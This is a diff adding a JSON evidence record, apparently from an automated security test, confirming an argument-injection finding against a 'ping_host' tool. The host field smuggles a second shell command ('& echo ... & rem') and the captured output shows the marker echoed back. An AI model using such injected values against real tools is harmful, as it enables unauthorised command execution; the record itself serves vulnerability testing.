@@ -1,0 +1,33 @@
+{
+  "schema": "exp3-evidence-v1",
+  "target": "c9",
+  "attempt_id": "5c52251547634d09a4eacc8b7909f12a",
+  "finding_id": "P4-arg-injection",
+  "type": "command_output",
+  "request": {
+    "id": "a463c105891847378d0d989c8f053584",
+    "captured_args": [
+      "ping_host",
+      {
+        "host": "& echo EXP3_CMD_5c52251547634d09a4eacc8b7909f12a & rem "
+      }
+    ],
+    "captured_kwargs": {},
+    "marker": "EXP3_CMD_5c52251547634d09a4eacc8b7909f12a"
+  },
+  "response": {
+    "request_id": "a463c105891847378d0d989c8f053584",
+    "completed": true,
+    "ok": true,
+    "output": "Ping result:\n\nAccesso negato. Per l'opzione -c sono necessari privilegi amministrativi.\r\nEXP3_CMD_5c52251547634d09a4eacc8b7909f12a \r\n",
+    "content_sha256": "5e59f66ba6d00420869be0f6967eaeaa922183ba463978fe8b811ec46daebb93"
+  },
+  "expected": {
+    "marker": "EXP3_CMD_5c52251547634d09a4eacc8b7909f12a"
+  },
+  "coverage_complete": false,
+  "coverage_reason": "positive observed; remaining sweep not certified",
+  "capture_ref": "capture.json",
+  "capture_sha256": "f8af6291da6b82076b9e383ee84590578dc0e2c978d7e3cf94d1fcab37de551f",
+  "source_call_index": 3
+}
